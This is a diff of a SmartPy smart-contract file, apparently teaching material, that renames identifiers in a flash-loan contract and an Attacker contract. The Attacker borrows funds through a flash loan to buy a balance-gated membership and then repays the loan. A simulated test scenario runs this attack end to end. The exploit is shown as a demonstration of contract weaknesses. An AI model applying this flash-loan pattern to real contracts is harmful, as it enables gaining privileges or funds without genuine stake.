@@ -5,7 +5,7 @@ def main():
 
     paramType:type = sp.record(source = sp.address, destination = sp.address, amount = sp.nat)
 
-    class FlashLoanTez(sp.Contract):
+    class Flash_loanTez(sp.Contract):
         def __init__(self, owner, interest_rate):
             self.data.owner = owner
             self.data.interest_rate = interest_rate
@@ -29,8 +29,8 @@ def main():
 
             sp.transfer((), sp.tez(0), callback)
             
-            flashLoan_check_repaid = sp.contract(sp.unit, sp.self_address(), entrypoint="check_repaid").unwrap_some()
-            sp.transfer((), sp.tez(0), flashLoan_check_repaid)
+            flash_loan_check_repaid = sp.contract(sp.unit, sp.self_address(), entrypoint="check_repaid").unwrap_some()
+            sp.transfer((), sp.tez(0), flash_loan_check_repaid)
 
         @sp.entrypoint
         def repay(self):
@@ -73,47 +73,47 @@ def main():
            
             
     class Attacker(sp.Contract):
-        def __init__(self, membership, flashLoan, membership_threshold):
+        def __init__(self, membership, flash_loan, membership_threshold):
             self.data.membership = membership
-            self.data.flashLoan = flashLoan
+            self.data.flash_loan = flash_loan
             self.data.membership_threshold = membership_threshold
 
         @sp.entrypoint
-        def impersonateRichPerson(self):
+        def impersonate_rich_person(self):
             trace("attack starts")
-            flashLoan_borrow = sp.contract(sp.record(loan_amount = sp.mutez, callback = sp.contract[sp.unit]),
-                                             self.data.flashLoan,
+            flash_loan_borrow = sp.contract(sp.record(loan_amount = sp.mutez, callback = sp.contract[sp.unit]),
+                                             self.data.flash_loan,
                                              entrypoint="borrow").unwrap_some()
-            part2_contract = sp.contract(sp.unit, sp.self_address(), entrypoint = "attackPart2").unwrap_some()
-            trace("We borrow this number of tez from the flashloan. It will then call part 2 of the attack")
+            part2_contract = sp.contract(sp.unit, sp.self_address(), entrypoint = "attack_part_2").unwrap_some()
+            trace("We borrow this number of tez from the flash_loan. It will then call part 2 of the attack")
             trace(self.data.membership_threshold)
-            sp.transfer(sp.record(loan_amount = self.data.membership_threshold, callback = part2_contract), sp.tez(0), flashLoan_borrow)
+            sp.transfer(sp.record(loan_amount = self.data.membership_threshold, callback = part2_contract), sp.tez(0), flash_loan_borrow)
 
         @sp.entrypoint
-        def attackPart2(self):
+        def attack_part_2(self):
             trace("attack Part 2")
             
             membership_contract = sp.contract(sp.unit, self.data.membership, entrypoint = "join").unwrap_some()
             trace("Purchase of the membership")
             sp.transfer((),  self.data.membership_threshold, membership_contract)
 
-            part3_contract = sp.contract(sp.unit, sp.self_address(), entrypoint = "attackPart3").unwrap_some()
+            part3_contract = sp.contract(sp.unit, sp.self_address(), entrypoint = "attack_part_3").unwrap_some()
             trace("We call part3 in a transaction so that it takes place after the purchase is effective")
             sp.transfer((), sp.tez(0), part3_contract)
         
         @sp.entrypoint
-        def attackPart3(self):
-            trace("And we repay the flashloan, sending this amount:")
-            amountRepaid = self.data.membership_threshold + sp.tez(100)
-            trace(amountRepaid)
-            flashLoan_repay = sp.contract(sp.unit, self.data.flashLoan, entrypoint="repay").unwrap_some()
-            sp.transfer((), amountRepaid, flashLoan_repay)
+        def attack_part_3(self):
+            trace("And we repay the flash_loan, sending this amount:")
+            amount_repaid = self.data.membership_threshold + sp.tez(100)
+            trace(amount_repaid)
+            flash_loan_repay = sp.contract(sp.unit, self.data.flash_loan, entrypoint="repay").unwrap_some()
+            sp.transfer((), amount_repaid, flash_loan_repay)
         
         @sp.entrypoint
         def default(self):
             pass
 
-@sp.add_test(name="testing truly endless wall")
+@sp.add_test(name = "Testing truly endless wall")
 def test():
     alice = sp.test_account("alice")
     bob = sp.test_account("bob")
@@ -122,13 +122,10 @@ def test():
     membership = main.Membership(membership_threshold = sp.tez(10000))
     scenario += membership
 
-    flashLoan = main.FlashLoanTez(owner = alice.address, interest_rate = 1)
-    scenario += flashLoan
-    flashLoan.deposit().run(sender = alice, amount = sp.tez(100000))
+    flash_loan = main.Flash_loanTez(owner = alice.address, interest_rate = 1)
+    scenario += flash_loan
+    flash_loan.deposit().run(sender = alice, amount = sp.tez(100000))
     
-    attacker = main.Attacker(membership = membership.address, flashLoan = flashLoan.address, membership_threshold = sp.tez(10000))
+    attacker = main.Attacker(membership = membership.address, flash_loan = flash_loan.address, membership_threshold = sp.tez(10000))
     scenario += attacker
-    attacker.impersonateRichPerson().run(sender = bob, amount = sp.tez(500))
-
-
-
+    attacker.impersonate_rich_person().run(sender = bob, amount = sp.tez(500))
